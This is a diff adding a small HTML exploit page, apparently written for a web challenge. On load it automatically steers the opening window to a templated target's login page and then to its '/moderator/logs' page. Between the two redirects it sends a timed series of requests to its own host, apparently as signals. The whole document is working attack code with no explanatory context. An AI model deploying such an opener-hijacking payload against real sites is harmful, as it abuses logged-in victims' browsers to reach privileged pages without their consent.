@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script>
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+async function pwn() {
+    opener.location = "{{ EXPLOIT_URL}}:3000/login";
+    fetch("/hifuck1")
+    for (let i = 0; i < 60; i++) {
+    await sleep(100);
+    fetch("/bruh"+i)
+}
+    fetch("/hifuck")
+    opener.location = "{{ EXPLOIT_URL }}:3000/moderator/logs";
+}
+</script>
+</head>
+<body onload="pwn()">
+    
+</body>
+</html>
+
